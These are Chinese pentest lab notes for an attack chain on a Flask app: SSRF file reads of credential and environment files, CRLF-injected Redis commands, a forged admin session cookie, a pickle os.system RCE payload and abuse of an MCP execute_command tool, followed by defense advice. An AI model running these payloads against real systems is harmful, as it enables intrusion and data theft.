<!-- 课堂抄的笔记，手写整理 -->

# 渗透测试笔记 - SSRF + Flask Session 伪造攻击链

## 一句话总结

这份笔记记录了一条完整攻击链：通过 SSRF 读取敏感信息，结合 CRLF 注入攻击内网 Redis，提取 Flask `secret_key` 伪造管理员会话，并进一步触发不安全反序列化实现 RCE。

---

## 1. 攻击链总览

```
SSRF -> 信息泄露 -> 内网Redis利用 -> 会话伪造 -> 反序列化RCE -> MCP服务攻击
```

### 详细步骤

1. 注册普通用户
2. 利用头像下载功能中的 SSRF 漏洞，通过 `file://` 读取本地文件（如 `/etc/redis/redis.conf`）
3. 从配置中提取 Redis 连接信息（密码、主机、端口）
4. 利用 Python `urllib` 的 CRLF 注入问题，向 Redis 注入命令并读取 `app:secret_key`
5. 使用 `itsdangerous` 库伪造 admin 用户 Cookie
6. 携带伪造 Cookie 访问 `/admin/users`，获取全部用户信息
7. 利用 Pickle 反序列化漏洞执行 RCE
8. 攻击 MCP 服务

---

## 2. SSRF 漏洞利用

### 2.1 核心问题

服务端未对用户传入 URL 做严格校验，导致攻击者可控制服务器代发请求。

### 2.2 利用方式

```python
# 使用file://协议读取本地文件
ssrf_url = f"file://{file_path}"
resp = session.get(f"{TARGET_URL}/api/avatar/download", params={"url": ssrf_url})
```

### 2.3 常见危害

- 读取本地敏感文件（如 `/etc/passwd`、`/proc/self/environ`）
- 探测内网服务
- 攻击内网资产（数据库、中间件、管理接口）

### 2.4 已读取的关键文件

| 文件路径 | 用途 |
|---------|------|
| `file:///proc/self/cmdline` | 确认进程启动参数 |
| `/proc/self/environ` | 提取环境变量中的敏感信息 |
| `app.py` | 代码审计 |
| `/opt/app-config/redis-config.json` | 应用侧 Redis 配置 |
| `/etc/redis/redis.conf` | Redis 系统配置 |

---

## 3. CRLF 注入攻击 Redis

### 3.1 漏洞原理

Python 3.7.3 的 `urllib` 存在 CRLF 注入漏洞，可通过 `%0d%0a` 注入换行符。

### 3.2 典型请求样例

```http
http://localhost:6379/%0d%0aAUTH%20redispass123%0d%0aSAVE%0d%0a
```

### 3.3 执行逻辑

1. SSRF 让服务器访问 `localhost:6379`
2. 通过 `%0d%0a` 注入换行，拼接 Redis 命令
3. `AUTH` 完成认证，`SAVE` 触发持久化
4. 读取 `/var/lib/redis/dump.rdb`，提取 `secret_key`

### 3.4 代码实现

```python
def exploit_crlf_redis_command(session, redis_config, commands):
    """利用CRLF注入向Redis发送命令"""
    host = redis_config.get("host", "localhost")
    port = redis_config.get("port", 6379)
    password = redis_config.get("password", "")

    crlf = "%0d%0a"
    cmd_sequence = ""

    # 认证
    if password:
        cmd_sequence += f"{crlf}AUTH%20{quote(password)}"

    # 添加命令
    for cmd in commands:
        encoded_cmd = cmd.replace(" ", "%20")
        cmd_sequence += f"{crlf}{encoded_cmd}"

    ssrf_url = f"http://{host}:{port}/{cmd_sequence}{crlf}"
    return session.get(f"{TARGET_URL}{SSRF_ENDPOINT}", params={"url": ssrf_url})
```

---

## 4. Flask Session 伪造

### 4.1 原理

Flask 使用 `itsdangerous` 库对 session 进行签名，知道 `secret_key` 即可伪造任意用户的 session。

### 4.2 从 Redis Dump 提取 Secret Key

```python
def extract_secret_key_from_dump(dump_content):
    """从Redis dump文件中提取secret_key"""
    # 方法1：匹配64位十六进制字符串
    hex_pattern = re.compile(r'[0-9a-fA-F]{64}')
    hex_matches = hex_pattern.findall(dump_content)

    # 方法2：查找app:secret_key键
    if b'app:secret_key' in dump_bytes:
        idx = dump_bytes.find(b'app:secret_key')
        after_key = dump_bytes[idx + len(b'app:secret_key'):idx + 100]
        # 提取密钥...
```

### 4.3 伪造 Session Cookie

```python
def forge_flask_session(secret_key, username):
    """伪造Flask session cookie"""
    from itsdangerous import URLSafeTimedSerializer
    from flask.sessions import TaggedJSONSerializer

    serializer = TaggedJSONSerializer()
    s = URLSafeTimedSerializer(
        secret_key,
        salt='cookie-session',
        serializer=serializer,
        signer_kwargs={'key_derivation': 'hmac', 'digest_method': 'sha1'}
    )

    session_data = {
        'username': username,
        'user_id': 1,
        'is_admin': True,
        'logged_in': True
    }

    return s.dumps(session_data)
```

---

## 5. Pickle 反序列化 RCE

### 5.1 业务流程分析

- 后台遍历 Redis 在线用户键
- 读取序列化数据
- 使用 `RestrictedUnpickler` 反序列化为对象
- 根据过期时间判断在线状态

### 5.2 风险分析

- 攻击者已可向 Redis 写入可控数据，反序列化输入可被污染
- `pickle` 对不可信输入天生不安全
- 最终可能导致远程代码执行（RCE）

### 5.3 RCE Payload

```python
class PickleRCE:
    """Pickle反序列化RCE payload"""
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        import os
        return (os.system, (self.cmd,))

# 生成payload
payload = pickle.dumps(PickleRCE("id > /tmp/result.txt"))
payload_b64 = base64.b64encode(payload).decode()
```

---

## 6. MCP 服务攻击

### 6.1 攻击步骤

1. 通过 RCE 写入 MCP 攻击脚本到 `/tmp/` 目录
2. 执行脚本，调用 MCP 的 `execute_command` 方法
3. 读取攻击结果

### 6.2 脚本写入方式

```python
# 使用base64编码避免特殊字符问题
script_b64 = base64.b64encode(script_content.encode()).decode()
write_cmd1 = f"echo '{script_b64}' > /tmp/mcp_attack_base64.txt"
write_cmd2 = f"base64 -d /tmp/mcp_attack_base64.txt > /tmp/mcp_attack.py"
```

---

## 7. 防御建议

### 7.1 SSRF 防护

- 仅允许 `http/https`，禁用 `file://`、`gopher://`、`dict://` 等协议
- 封禁对内网网段和高危端口的访问
- 对 URL 做严格白名单校验，限制重定向

### 7.2 CRLF 注入防护

- 升级 Python 与相关库，修复已知漏洞
- 对用户输入过滤 `\r`、`\n` 等控制字符

### 7.3 Redis 加固

- 仅监听内网指定 IP，避免公网暴露
- 使用高强度密码并定期轮换
- 禁用或重命名高危命令（如 `CONFIG`、`EVAL`、`FLUSHALL`）

### 7.4 会话与反序列化安全

- 用 JSON 等安全格式替代 `pickle`
- 为会话数据增加 HMAC 完整性校验
- 后台敏感路由增加二次认证与访问控制
- 增加异常监控告警，识别异常反序列化行为

---

## 8. 文件结构

```
school/
├── ssrf_attack.py      # 主攻击脚本（完整实现）
├── README.md           # 本文档（攻击链说明）
├── １.py               # 原始框架文件（已废弃）
└── １.md               # 原始笔记文件（已废弃）
```

---

## 9. 使用方法

```bash
# 安装依赖
pip install requests itsdangerous flask

# 修改配置
# 编辑 ssrf_attack.py 中的 TARGET_URL 等配置

# 运行攻击
python ssrf_attack.py
```

---

## 10. 最终结论

该案例体现了多漏洞链式利用的典型路径：

```
SSRF -> 信息泄露 -> 内网Redis利用 -> 会话伪造 -> 反序列化RCE -> MCP攻击
```

修复应以源头限制输入与协议访问为主，同时对会话、序列化和内网服务做分层加固。
